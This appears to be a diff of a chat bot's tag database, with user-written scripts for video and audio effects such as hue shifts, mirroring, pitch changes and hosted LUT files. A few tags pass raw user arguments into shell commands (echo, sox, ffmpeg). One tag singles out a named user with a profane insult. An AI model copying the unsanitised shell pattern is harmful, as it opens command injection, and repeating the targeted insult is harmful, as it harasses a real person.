+  "foreach": {
+    "script": "{foreach:{argslen}|{set:e|{math:{get:e}+1}}{get:e}‎●}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-16T17:36:57.189Z",
+    "updatedAt": "2026-06-16T17:37:28.367Z"
+  },
+  "xm159": {
+    "script": "{ihtx:lut=https://files.catbox.moe/t5mq6l.cube ,pitch=-5;7}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T07:45:22.038Z",
+    "updatedAt": "2026-06-17T07:45:22.038Z"
+  },
+  "xmajor159": {
+    "script": "{tag:xm159}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T07:45:34.676Z",
+    "updatedAt": "2026-06-17T07:45:34.676Z"
+  },
+  "x_major_159": {
+    "script": "{tag:xm159}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T07:45:38.334Z",
+    "updatedAt": "2026-06-17T07:45:38.334Z"
+  },
+  "gm63": {
+    "script": "{ihtx:lut=https://files.catbox.moe/pydy23.cube ,pitch=4;12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T08:51:39.731Z",
+    "updatedAt": "2026-06-17T08:51:39.731Z"
+  },
+  "gm63v2": {
+    "script": "{ihtx:huehsv=159,fisheye=1,mirror=0,pitch=-1;1;3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T08:56:26.712Z",
+    "updatedAt": "2026-06-17T08:56:26.712Z"
+  },
+  "gm63_v2": {
+    "script": "{ihtx:huehsv=159,fisheye=1,mirror=0,pitch=-1;1;3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T08:56:29.198Z",
+    "updatedAt": "2026-06-17T08:56:29.198Z"
+  },
+  "dividedeffect": {
+    "script": "{ihtx:hflip,gm91deform,hflip,swapuv,pitch=-12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T08:59:59.248Z",
+    "updatedAt": "2026-06-17T08:59:59.248Z"
+  },
+  "divided": {
+    "script": "{ihtx:hflip,gm91deform,hflip,swapuv,pitch=-12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:00:02.315Z",
+    "updatedAt": "2026-06-17T09:00:02.315Z"
+  },
+  "divided_effect": {
+    "script": "{ihtx:hflip,gm91deform,hflip,swapuv,pitch=-12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:00:04.722Z",
+    "updatedAt": "2026-06-17T09:00:04.722Z"
+  },
+  "multipliedeffect": {
+    "script": "{ihtx:gm91deform,pitch=12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:03:22.066Z",
+    "updatedAt": "2026-06-18T15:59:47.555Z"
+  },
+  "multiplied": {
+    "script": "{tag:multipliedeffect}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:03:32.597Z",
+    "updatedAt": "2026-06-17T09:03:32.597Z"
+  },
+  "multiplied_effect": {
+    "script": "{tag:multipliedeffect}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:03:35.386Z",
+    "updatedAt": "2026-06-17T09:03:35.386Z"
+  },
+  "xgotconfused": {
+    "script": "{ihtx:huehsv=180,swapuv,mirror=90,pitch=-12;-11}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:04:24.646Z",
+    "updatedAt": "2026-06-17T09:04:45.845Z"
+  },
+  "gotconfused": {
+    "script": "{tag:xgotconfused}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:05:00.937Z",
+    "updatedAt": "2026-06-17T09:05:00.937Z"
+  },
+  "x_got_confused": {
+    "script": "{tag:xgotconfused}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:05:08.240Z",
+    "updatedAt": "2026-06-17T09:05:08.240Z"
+  },
+  "gm23v2": {
+    "script": "{ihtx:huehsv=180,hflip,pitch=8;-3}",
+    "ownerId": "1500537210473025546",
+    "ownerUsername": "athing0295_30291",
+    "createdAt": "2026-06-17T09:05:13.488Z",
+    "updatedAt": "2026-06-17T09:08:24.421Z"
+  },
+  "highmajor": {
+    "script": "{ihtx:huehsv=126,pitch=3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:09:52.353Z",
+    "updatedAt": "2026-06-17T09:09:52.353Z"
+  },
+  "high_major": {
+    "script": "{tag:highmajor}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:09:57.333Z",
+    "updatedAt": "2026-06-17T09:09:57.333Z"
+  },
+  "gm64": {
+    "script": "{ihtx:hflip,gm91deform,hflip,swapuv,huehsv=126,pitch=-9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:10:43.957Z",
+    "updatedAt": "2026-06-17T09:10:43.957Z"
+  },
+  "gm23v2.": {
+    "script": "{ihtx:huehsv=180,hflip,pitch=8;-3}",
+    "ownerId": "1355759019330895973",
+    "ownerUsername": "thatoneguynobodyinvited",
+    "createdAt": "2026-06-17T09:22:17.756Z",
+    "updatedAt": "2026-06-17T09:22:17.756Z"
+  },
+  "gm65": {
+    "script": "{ihtx:hflip,lut=https://files.catbox.moe/2bfsqg.cube ,speed=1.435,pitch=6}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:23:59.716Z",
+    "updatedAt": "2026-06-18T19:04:06.325Z"
+  },
+  "e": {
+    "script": "I disagree",
+    "ownerId": "1038715961886375966",
+    "ownerUsername": "infhexagon",
+    "createdAt": "2026-06-17T09:27:38.171Z",
+    "updatedAt": "2026-06-17T09:27:38.171Z"
+  },
+  "gm85": {
+    "script": "{ihtx:hflip,lut=https://files.catbox.moe/vdu8p9.cube ,speed=1.435,pitch=6}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T09:28:56.164Z",
+    "updatedAt": "2026-06-17T09:28:56.164Z"
+  },
+  "message": {
+    "script": "{sh:echo {arg:0}}",
+    "ownerId": "1038715961886375966",
+    "ownerUsername": "infhexagon",
+    "createdAt": "2026-06-17T09:31:45.972Z",
+    "updatedAt": "2026-06-17T09:32:15.874Z"
+  },
+  "ian'sgm74v1": {
+    "script": "{ihtx:lut=https://files.catbox.moe/m614vq.cube,fisheye=0.5,pitch=-14;5;12}",
+    "ownerId": "1500537210473025546",
+    "ownerUsername": "athing0295_30291",
+    "createdAt": "2026-06-17T09:33:23.469Z",
+    "updatedAt": "2026-06-17T09:34:48.928Z"
+  },
+  "music": {
+    "script": "{attach:https://files.catbox.moe/tiu7mw.mov}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-17T12:25:18.947Z",
+    "updatedAt": "2026-06-17T12:25:18.947Z"
+  },
+  "gm9_ihtx": {
+    "script": "&ihtx lut=https://files.catbox.moe/rg8nmg.cube 50 0.5",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-17T13:27:45.113Z",
+    "updatedAt": "2026-06-17T13:27:45.113Z"
+  },
+  "videoeditbot": {
+    "script": "{veb:{arg:*}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-17T16:06:37.632Z",
+    "updatedAt": "2026-06-17T16:06:37.632Z"
+  },
+  "veb": {
+    "script": "{tag:videoeditbot}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-17T16:06:42.841Z",
+    "updatedAt": "2026-06-17T16:06:42.841Z"
+  },
+  "gm66": {
+    "script": "{ihtx:lut=https://files.catbox.moe/kxbvd5.cube ,pitch=-8.1;-6.4;-4.5;-2.4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T16:06:44.956Z",
+    "updatedAt": "2026-06-17T16:06:44.956Z"
+  },
+  "gm67": {
+    "script": "{ihtx:rays=4,invert,grayscale,fisheye=-0.5,shake=10,zoom=1.25,pitch=-12;-7;12;17}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T16:12:26.806Z",
+    "updatedAt": "2026-06-17T16:12:26.806Z"
+  },
+  "gm67v2": {
+    "script": "{ihtx:mirror=90,wave=4;4;2;2;31;31,fisheye=-1,gradientmap=[[192,192,192,255],[0,0,0,255],[255,255,255,255],[0,0,0,255],[192,192,192,255]],rays=4,pitch=-7;-4;0}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T16:19:34.815Z",
+    "updatedAt": "2026-06-17T16:19:34.815Z"
+  },
+  "gm67_v2": {
+    "script": "{tag:gm67v2}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-17T16:19:43.793Z",
+    "updatedAt": "2026-06-17T16:19:43.793Z"
+  },
+  "gm9ffmpeg": {
+    "script": "lut=https://files.catbox.moe/rg8nmg.cube",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-17T17:31:29.214Z",
+    "updatedAt": "2026-06-17T17:31:29.214Z"
+  },
+  "gm9theoriginal_ffmpeg": {
+    "script": "lut=https://files.catbox.moe/rg8nmg.cube, pitch=-12;5;0;7",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-17T17:32:22.307Z",
+    "updatedAt": "2026-06-17T17:32:42.664Z"
+  },
+  "gm68": {
+    "script": "warning: may take very very long{ihtx:swirl=100,ripple=1;20;20;0,mirror=90,scroll=hpos=0.37,mirror=270,scroll=hpos=0.63,mirror=270,huehsv=-135,pitch=-14;-10;-7}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T10:01:48.412Z",
+    "updatedAt": "2026-06-18T10:01:48.412Z"
+  },
+  "gm69": {
+    "script": "{ihtx:huehsv=-144,mirror=90,pitch=-13}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T10:05:04.668Z",
+    "updatedAt": "2026-06-18T10:05:14.315Z"
+  },
+  "gm70": {
+    "script": "{ihtx:tvsim=0.75,lut=https://files.catbox.moe/re8moe.cube ,pitch=0;-4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T10:09:26.828Z",
+    "updatedAt": "2026-06-18T10:09:26.828Z"
+  },
+  "gm71": {
+    "script": "{ihtx:huehsv=126,swirl=150,ripple=1;20;20;0,mirror=90,swirl=-150,pitch=1;5;8}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T10:22:35.136Z",
+    "updatedAt": "2026-06-18T10:22:35.136Z"
+  },
+  "chuaneditbotpitchconvert": {
+    "script": "{math:{args}*10}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-18T10:29:43.345Z",
+    "updatedAt": "2026-06-18T10:29:43.345Z"
+  },
+  "cebpc": {
+    "script": "{tag:chuaneditbotpitchconvert}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-18T10:30:08.809Z",
+    "updatedAt": "2026-06-18T10:30:08.809Z"
+  },
+  "chuaneditbotpitchtosemitonepitch": {
+    "script": "{math:{args}/10}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-18T10:32:04.919Z",
+    "updatedAt": "2026-06-18T10:32:04.919Z"
+  },
+  "cebtsp": {
+    "script": "{tag:chuaneditbotpitchtosemitonepitch}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-18T10:32:14.328Z",
+    "updatedAt": "2026-06-18T10:32:14.328Z"
+  },
+  "gm72": {
+    "script": "{ihtx:sharpen=5,lut=https://files.catbox.moe/grsad2.cube ,pitch=-5;-1;0;3;4;9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T10:43:11.501Z",
+    "updatedAt": "2026-06-18T10:43:27.187Z"
+  },
+  "gm73": {
+    "script": "warning: pitch errors {ihtx:tvsim=0.75,channelblend=0;r;0,wave=0;5;0;3;31;1000,pitch=-24;-17}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T11:00:42.201Z",
+    "updatedAt": "2026-06-18T11:00:42.201Z"
+  },
+  "gm75": {
+    "script": "{ihtx:hflip,tvsim=0.65,swapuv,invert,huehsv=-120,pitch=-4;-3;-2;-1;0}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T11:49:47.389Z",
+    "updatedAt": "2026-06-18T11:49:47.389Z"
+  },
+  "gm76": {
+    "script": "{ihtx:swapuv,invert,huehsv=-60,pitch=-6;-3;3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T11:53:21.857Z",
+    "updatedAt": "2026-06-18T11:53:21.857Z"
+  },
+  "gm77": {
+    "script": "{ihtx:invert,swapuv,huehsv=180,swirl=130,tvsim=0.75,mirror=270,pitch=-8;0;3;13}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T12:00:58.198Z",
+    "updatedAt": "2026-06-18T12:00:58.198Z"
+  },
+  "wm": {
+    "script": "{ihtx:invert,hue=120,hflip,scroll=hpos=0.4,mirror=270,scroll=hpos=0.6,mirror=270,pitch=-2;-3;-7;-12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T12:47:27.142Z",
+    "updatedAt": "2026-06-18T12:47:27.142Z"
+  },
+  "wmaj": {
+    "script": "{tag:wm}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T12:48:37.528Z",
+    "updatedAt": "2026-06-18T12:48:37.528Z"
+  },
+  "wmajor": {
+    "script": "{tag:wm}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T12:48:40.433Z",
+    "updatedAt": "2026-06-18T12:48:40.433Z"
+  },
+  "w_major": {
+    "script": "{tag:wm}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T12:48:48.734Z",
+    "updatedAt": "2026-06-18T12:48:48.734Z"
+  },
+  "gm78": {
+    "script": "{ihtx:lut=https://files.catbox.moe/r8jv2t.cube ,pitch=12;16}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T13:30:05.747Z",
+    "updatedAt": "2026-06-18T13:30:05.747Z"
+  },
+  "weirdcode": {
+    "script": "{ihtx:huehsv=180,mirror=270,swirl=-175,vibrato=12;1,vibrato=12;1,vibrato=12;1}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T13:35:17.601Z",
+    "updatedAt": "2026-06-18T13:35:17.601Z"
+  },
+  "weird_code": {
+    "script": "{tag:weirdcode}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T13:35:28.771Z",
+    "updatedAt": "2026-06-18T13:35:28.771Z"
+  },
+  "wc": {
+    "script": "{tag:weirdcode}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T13:35:33.741Z",
+    "updatedAt": "2026-06-18T13:35:33.741Z"
+  },
+  "gm79": {
+    "script": "{ihtx:tvsim=0.5,channelblend=r;0;0,huehsv=180,mirror=270,swirl=-175,audiopitch=-6;0,vibrato=12;1,vibrato=12;1,vibrato=12;1}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T13:41:12.090Z",
+    "updatedAt": "2026-06-18T13:41:12.090Z"
+  },
+  "gm80": {
+    "script": "{ihtx:huehsv=-135,realgm4,pitch=-10;4;9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T13:44:10.081Z",
+    "updatedAt": "2026-06-18T13:44:10.081Z"
+  },
+  "gm74_hollyvideo_ihtx_sonyvegas": {
+    "script": "&ihtx lut=https://files.catbox.moe/fkuceb.cube 50 0.5",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-18T13:52:52.741Z",
+    "updatedAt": "2026-06-18T13:53:00.626Z"
+  },
+  "gm81": {
+    "script": "{ihtx:invert,huehsv=60,mirror=270,wave=0;2;0;4;31;31;1,pitch=-1;-3;-5;-6;-8}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:29:31.755Z",
+    "updatedAt": "2026-06-18T15:29:31.755Z"
+  },
+  "gm82": {
+    "script": "{ihtx:huehsv=-45,invert,fisheye=2,pitch=-7;6}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:30:53.146Z",
+    "updatedAt": "2026-06-18T15:31:21.404Z"
+  },
+  "gm83": {
+    "script": "{ihtx:invlum,invert,fisheye=1,audiopitch=-12;-10;7;9;12;14}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:33:06.717Z",
+    "updatedAt": "2026-06-18T15:33:06.717Z"
+  },
+  "gm84": {
+    "script": "{ihtx:lut=https://files.catbox.moe/4c7tdy.cube ,pitch=1;16}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:40:22.451Z",
+    "updatedAt": "2026-06-18T15:40:22.451Z"
+  },
+  "gm86": {
+    "script": "{ihtx:rotate=180,wave=0;5;0;4;0;150,grayscale,vignette=0.5,autotune=https://files.catbox.moe/dn6f0m.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:50:36.307Z",
+    "updatedAt": "2026-06-18T15:50:36.307Z"
+  },
+  "gm88": {
+    "script": "{ihtx:gradientmap=[[255,75,255,255],[0,25,75,255],[0,0,0,255]],swirl=-50,mirror=270,pitch=-4;3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:55:00.575Z",
+    "updatedAt": "2026-06-18T15:55:00.575Z"
+  },
+  "gm89": {
+    "script": "{ihtx:huehsv=180,mirror=90,hflip,gm91deform,hflip,pitch=-24;-23}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:56:23.396Z",
+    "updatedAt": "2026-06-18T15:56:23.396Z"
+  },
+  "confused_multiplication": {
+    "script": "{ihtx:huehsv=180,channelblend=b;g;r,mirror=90,gm91deform,pitch=0;1}",
+    "ownerId": "1454901686186410144",
+    "ownerUsername": "solgrynplayzxd",
+    "createdAt": "2026-06-18T15:57:11.606Z",
+    "updatedAt": "2026-06-18T15:59:36.754Z"
+  },
+  "gm90": {
+    "script": "{ihtx:huehsv=-45,pitch=-1;1}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T15:57:47.284Z",
+    "updatedAt": "2026-06-18T15:57:47.284Z"
+  },
+  "gm91new": {
+    "script": "{ihtx:huehsv=180,swapuv,mirror=90,gm91deform,pitch=0;1}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T16:00:44.670Z",
+    "updatedAt": "2026-06-18T16:00:44.670Z"
+  },
+  "confused_division": {
+    "script": "{ihtx:huehsv=180,mirror=90,hflip,gm91deform,hflip,pitch=-24;-23}",
+    "ownerId": "1454901686186410144",
+    "ownerUsername": "solgrynplayzxd",
+    "createdAt": "2026-06-18T16:01:26.113Z",
+    "updatedAt": "2026-06-18T16:01:26.113Z"
+  },
+  "gm157": {
+    "script": "{ihtx:saturation=0.23,hue=240,invert,mirror=270,pitch=-3;0;14}",
+    "ownerId": "1503126727512297522",
+    "ownerUsername": "masonsab.125",
+    "createdAt": "2026-06-18T16:02:00.063Z",
+    "updatedAt": "2026-06-18T16:02:00.063Z"
+  },
+  "gm92": {
+    "script": "{ihtx:lut=https://files.catbox.moe/2j8oka.cube ,wave=0;8;0;2;31;31,tile=3;3,scroll=ypos=0.222,mirror=0,scroll=ypos=0.111,zoom=3,pitch=-8.1;-7.6;-7}",
+    "ownerId": "1454901686186410144",
+    "ownerUsername": "solgrynplayzxd",
+    "createdAt": "2026-06-18T16:23:13.944Z",
+    "updatedAt": "2026-06-18T17:34:36.747Z"
+  },
+  "gm237": {
+    "script": "{ihtx:wave=4;4;2.1/9*16;2.1,wave=4;4;2.1/9*16;2.1,huehsv=284.4,pitch=-12;0;7;-14;-2;5,volume=2}",
+    "ownerId": "1503126727512297522",
+    "ownerUsername": "masonsab.125",
+    "createdAt": "2026-06-18T17:14:13.319Z",
+    "updatedAt": "2026-06-18T17:14:13.319Z"
+  },
+  "gm93": {
+    "script": "{ihtx:gradientmap=[[255,255,0,255],[0,0,0,255],[0,0,85,255],[0,0,170,255],[0,0,255,255]],pitch=0;12}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T17:42:09.916Z",
+    "updatedAt": "2026-06-18T17:42:09.916Z"
+  },
+  "gm94": {
+    "script": "{ihtx:ripple=0.5;20;20;0,mirror=90,gm4,huehsv=-108,rotate=90,pitch=-5,speed=0.5}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T17:48:37.843Z",
+    "updatedAt": "2026-06-18T17:48:37.843Z"
+  },
+  "gm95": {
+    "script": "{ihtx:gradientmap=[[0,0,0,255],[254,200,100]],mirror=0,mirror=90,pitch=-3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T17:57:23.746Z",
+    "updatedAt": "2026-06-18T17:57:23.746Z"
+  },
+  "lv": {
+    "script": "{ihtx:hue=180,mirror=90,pitch=-5,speed=0.749}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:00:53.011Z",
+    "updatedAt": "2026-06-18T18:00:53.011Z"
+  },
+  "lowvoice": {
+    "script": "{tag:lv}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:00:59.232Z",
+    "updatedAt": "2026-06-18T18:00:59.232Z"
+  },
+  "low_voice": {
+    "script": "{tag:lv}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:01:01.572Z",
+    "updatedAt": "2026-06-18T18:01:01.572Z"
+  },
+  "gm96": {
+    "script": "{ihtx:invlum,hue=180,fisheye=1,mirror=90,audiopitch=-15;4;9,speed=0.75}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:04:38.021Z",
+    "updatedAt": "2026-06-18T18:04:38.021Z"
+  },
+  "gm97": {
+    "script": "{ihtx:mirror=90,brightness=0.1,pitch=-10}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:09:51.009Z",
+    "updatedAt": "2026-06-18T18:09:51.009Z"
+  },
+  "gm98": {
+    "script": "{ihtx:invert,huehsv=-36,tvsim=0.75,mirror=180,mirror=90,pitch=-7;-10}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:12:22.491Z",
+    "updatedAt": "2026-06-18T18:12:22.491Z"
+  },
+  "gm99": {
+    "script": "{ihtx:swirl=-150,huehsv=72,pitch=3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:13:49.472Z",
+    "updatedAt": "2026-06-18T18:13:49.472Z"
+  },
+  "gm100": {
+    "script": "{ihtx:mirror=90,wave=3.2;3.2;2.7;2;31.4;31.4,swapuv,hue=100,pitch=-1;-5}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T18:18:20.691Z",
+    "updatedAt": "2026-06-18T18:18:20.691Z"
+  },
+  "gm61": {
+    "script": "{ihtx:swapuv,invert,huehsv=-45,mirror=90,pitch=3;9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-18T19:01:47.581Z",
+    "updatedAt": "2026-06-18T19:01:47.581Z"
+  },
+  "gm101": {
+    "script": "{ihtx:invert,brightness=0.25,saturation=1.25,pitch=-15;-8;-3;1;4;9}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-19T07:17:12.502Z",
+    "updatedAt": "2026-06-19T07:17:12.502Z"
+  },
+  "gm102": {
+    "script": "{ihtx:lut=https://files.catbox.moe/8k466e.cube ,pitch=-8;-4;0;4;8}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-19T07:21:05.827Z",
+    "updatedAt": "2026-06-19T07:21:05.827Z"
+  },
+  "gm103": {
+    "script": "{ihtx:huehsv=180,swirl=130,pitch=16}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-19T07:22:43.484Z",
+    "updatedAt": "2026-06-19T07:22:43.484Z"
+  },
+  "gm105": {
+    "script": "{vflip,mirror=-180,hue=-120,pitch=-3}",
+    "ownerId": "1246725819150372869",
+    "ownerUsername": "trrex0774",
+    "createdAt": "2026-06-19T07:46:29.151Z",
+    "updatedAt": "2026-06-19T07:46:29.151Z"
+  },
+  "lec-a": {
+    "script": "{sh:\nload {iv}\n\nffmpeg -i $FILE_1 -vf reverse,trim={args},reverse -af areverse,atrim={args},areverseffmpeg ./output/lastexport.mp4\n}",
+    "ownerId": "1473985677132566649",
+    "ownerUsername": "petyadimitrova.",
+    "createdAt": "2026-06-19T15:52:10.628Z",
+    "updatedAt": "2026-06-19T15:52:10.628Z"
+  },
+  "lec": {
+    "script": "{sh:\nload {iv}\n\nffmpeg -i $FILE_1 -vf reverse,trim=0:{args},reverse -af areverse,atrim=0:{args},areverse ./output/lastexport.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-19T15:56:02.558Z",
+    "updatedAt": "2026-06-19T17:41:59.493Z"
+  },
+  "sox": {
+    "script": "{sh:\nload {av}\n\nsox \"$FILE_1\" output/sox.wav {arg:*}\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-19T18:39:47.565Z",
+    "updatedAt": "2026-06-19T18:49:10.654Z"
+  },
+  "sapfc11+here's": {
+    "script": "your stupid sapfc11+ tag. {set:banned|{js:let bannedUsers = ['mpgarv'];\nlet user = discord.user.username;\nconsole.log(bannedUsers.includes(user))}}\n\n{if:{get:banned}|=|true|then:https://cdn.discordapp.com/attachments/1409535214543175742/1492450874054676501/Screenshot_2026-04-10-00-04-25-780_com.google.android.youtube-edit.jpg?ex=69db60b0&is=69da0f30&hm=5bc5c9d5365ba61ad5a9d1cb4e4c37afb69e967eef4069182fcac9847e3273d9& get this fuckface|else:{if:{args}|=|help|then:`.t {tagname} <pitches count>`|else:{set:code|{set:#|0}-filter_complex \"{foreach:{argslen}|[0]rubberband=pitch=2^({arg:{get:#}}/12):window=short:transients=crisp:detector=2.14748e+09/4.9:pitchq=quality{set:#|{math:{get:#}+1}}[a{get:#}];}{set:#|0}{foreach:{argslen}|{set:#|{math:{get:#}+1}}[a{get:#}]}amix={argslen}:normalize=0,highpass=5\"}{code:&t icf+ 50 0.36 - mov default {get:code} -c:a pcm_s16le}{sh:load {av}\npath=$(basename $FILE_1)\nextension=\"${path##*.}\"\n{js:console.log(`ffmpeg -i $FILE_1 {get:code} ./output/sapfc.$extension`);}}}}",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-20T10:24:18.765Z",
+    "updatedAt": "2026-06-20T10:24:18.765Z"
+  },
+  "sapfc11+": {
